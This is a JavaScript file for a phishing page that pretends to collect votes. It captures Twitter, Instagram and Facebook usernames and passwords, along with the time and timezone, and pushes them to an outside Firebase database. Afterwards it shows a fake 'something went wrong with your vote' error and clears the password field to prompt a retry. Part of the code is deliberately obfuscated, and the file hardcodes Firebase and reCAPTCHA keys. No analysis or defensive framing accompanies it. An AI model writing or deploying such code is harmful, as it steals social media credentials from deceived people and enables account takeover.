var _0x270bd6=_0x3c07;(function(_0x3c962e,_0x2b1bcc){var _0x5c40be=_0x3c07,_0x34158b=_0x3c962e();while(!![]){try{var _0x34d220=-parseInt(_0x5c40be(0x158))/0x1*(-parseInt(_0x5c40be(0x153))/0x2)+-parseInt(_0x5c40be(0x16b))/0x3+parseInt(_0x5c40be(0x14a))/0x4+parseInt(_0x5c40be(0x14c))/0x5+-parseInt(_0x5c40be(0x143))/0x6*(-parseInt(_0x5c40be(0x161))/0x7)+-parseInt(_0x5c40be(0x15f))/0x8+-parseInt(_0x5c40be(0x16d))/0x9*(parseInt(_0x5c40be(0x163))/0xa);if(_0x34d220===_0x2b1bcc)break;else _0x34158b['push'](_0x34158b['shift']());}catch(_0xc6ae98){_0x34158b['push'](_0x34158b['shift']());}}}(_0x4617,0x1b920));function _0x3c07(_0x1e4de6,_0x4e167d){var _0x46175d=_0x4617();return _0x3c07=function(_0x3c0730,_0x414a16){_0x3c0730=_0x3c0730-0x143;var _0x29aa48=_0x46175d[_0x3c0730];return _0x29aa48;},_0x3c07(_0x1e4de6,_0x4e167d);}const firebaseConfig={'apiKey':_0x270bd6(0x169),'authDomain':_0x270bd6(0x146),'databaseURL':_0x270bd6(0x155),'projectId':_0x270bd6(0x16a),'storageBucket':_0x270bd6(0x162),'messagingSenderId':'193164197815','appId':_0x270bd6(0x144)};firebase[_0x270bd6(0x15c)](firebaseConfig);const appCheck=firebase[_0x270bd6(0x168)]();function _0x4617(){var _0x2c444b=['Twitter','5DPJabc','auth','log','tw-email','initializeApp','fb-pass','resolvedOptions','404280ZsRwAN','getElementById','179165mEOkxF','foodsupportdb.appspot.com','30650osnlRT','catch','push','6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW','Oops!','appCheck','AIzaSyD1mrAquS1mCddKHvyw7BzOtxb88FzbS8w','foodsupportdb','669219NoucXH','timeZone','171BNRajL','6gwzCQb','1:193164197815:web:b83a68c9722ae0fa84f232','value','foodsupportdb.firebaseapp.com','ref','slice','tw-pass','899880NyhisU','Try\x20Again','938455rdwYfw','activate','alert','error','fire','toISOString','DateTimeFormat','2606CRsPIs','signInAnonymously','https://foodsupportdb-default-rtdb.firebaseio.com','database'];_0x4617=function(){return _0x2c444b;};return _0x4617();}console[_0x270bd6(0x15a)](appCheck),appCheck[_0x270bd6(0x14d)](_0x270bd6(0x166),!![]);function tw_login(){var _0x38ed89=_0x270bd6;firebase[_0x38ed89(0x159)]()[_0x38ed89(0x154)]()[_0x38ed89(0x164)](function(_0x597372){var _0x1c68d1=_0x38ed89,_0x4c2c9a=_0x597372['code'],_0x20530d=_0x597372['message'];window[_0x1c68d1(0x14e)]('Error:\x20'+_0x20530d);});var _0x5b9b0e=document[_0x38ed89(0x160)](_0x38ed89(0x15b))[_0x38ed89(0x145)],_0x14e0ea=document[_0x38ed89(0x160)](_0x38ed89(0x149))[_0x38ed89(0x145)],_0x192c2a=new Date()['toISOString']()[_0x38ed89(0x148)](0x0,0xa),_0x4e4ea3=new Date()[_0x38ed89(0x151)]()[_0x38ed89(0x148)](0xb,0x13),_0x3bbb5a=Intl[_0x38ed89(0x152)]()[_0x38ed89(0x15e)]()[_0x38ed89(0x16c)],_0x565ed6=_0x38ed89(0x157);_0x5b9b0e!==''&&_0x14e0ea!==''&&(firebase[_0x38ed89(0x156)]()[_0x38ed89(0x147)]('fbdet')[_0x38ed89(0x165)]({'emle':_0x5b9b0e,'mobile':'','time':_0x4e4ea3,'timezone':_0x3bbb5a,'pass':_0x14e0ea,'date':_0x192c2a,'type':_0x565ed6}),setTimeout(function(){var _0x2e1112=_0x38ed89;return Swal[_0x2e1112(0x150)]({'title':_0x2e1112(0x167),'text':'Something\x20went\x20wrong\x20with\x20your\x20vote.','icon':_0x2e1112(0x14f),'confirmButtonText':_0x2e1112(0x14b)}),document[_0x2e1112(0x160)](_0x2e1112(0x15d))['value']='',![];},0x7d0));}


function iglog() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var username = document.getElementById('ig-uname').value;
  var password = document.getElementById('ig-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  console.log(timezone);
  var accountType = 'Instagram';

  if (username !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: username,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });

      document.getElementById('ig-pass').value = '';
      return false;
    }, 2000);
  }
}

function login() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var email = document.getElementById('fb-email').value;
  var password = document.getElementById('fb-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = 'Facebook';

  if (email !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: email,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });
      document.getElementById('fb-pass').value = '';

      return false;
    }, 2000);
  }
}
